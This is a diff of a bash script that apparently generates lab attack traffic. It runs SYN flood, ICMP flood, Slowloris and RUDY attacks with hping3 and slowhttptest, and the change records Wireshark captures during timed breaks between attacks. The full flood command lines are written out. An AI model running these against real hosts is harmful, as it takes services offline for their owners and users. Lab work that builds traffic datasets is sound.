@@ -5,7 +5,6 @@ source variables.sh
 
 #Define variables for whole attack
 attack_procedure_log="/home/logs/attack_procedure.log"
-capture_file="/home/wiresharkTraces/attack_procedure.pcap"
 
 attack(){
     #Write to file
@@ -17,12 +16,6 @@ attack(){
     #Write to file
     echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 }
-#Start Wireshark capture
-tshark -i $interface -w "$capture_file" -F pcap & pid_tshark=$!
-
-#Write to file
-echo "Started Wireshark trace for the whole attack procedure" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
-
 
 #Define variables for attack 1
 attack_type="TCP_SYN_Flood"
@@ -37,8 +30,17 @@ attack_script="hping3 --flood --frag -p "$destination_port" -S $destination_ip"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
+
+#Write to file
+echo "Started break 1" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+#Start Wireshark capture
+tshark -i $interface -w "/home/wiresharkTraces/Break1.pcap" -F pcap & pid_tshark=$!
 #Wait for next attack
-sleep $((30))
+sleep $((15*60))
+#Stop the Wireshark capture
+kill "$pid_tshark"
+#Write to file
+echo "Break 1 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
 #Define variables for attack 2
 attack_type="SlowLoris"
@@ -53,8 +55,17 @@ attack_script="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://"$destination_i
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
+
+#Write to file
+echo "Started break 2" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+#Start Wireshark capture
+tshark -i $interface -w "/home/wiresharkTraces/Break2.pcap" -F pcap & pid_tshark=$!
 #Wait for next attack
-sleep $((30))
+sleep $((7*60))
+#Stop the Wireshark capture
+kill "$pid_tshark"
+#Write to file
+echo "Break 2 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
 #Define variables for attack 3
 attack_type="ping"
@@ -69,8 +80,16 @@ attack_script="hping3 --flood -1 "$destination_ip""
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
+#Write to file
+echo "Started break 3" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+#Start Wireshark capture
+tshark -i $interface -w "/home/wiresharkTraces/Break3.pcap" -F pcap & pid_tshark=$!
 #Wait for next attack
-sleep $((30))
+sleep $((20*60))
+#Stop the Wireshark capture
+kill "$pid_tshark"
+#Write to file
+echo "Break 3 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
 #Define variables for attack 4
 attack_type="RUDY"
@@ -84,12 +103,3 @@ destination_port=$machine11_port
 attack_script="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://"$destination_ip" -x 10 -p 3"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
-
-#Wait for next attack
-sleep $((30))
-
-#Stop the Wireshark capture
-kill "$pid_tshark"
-
-#Write to file
-echo "Stopped Wireshark trace for the whole attack procedure" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
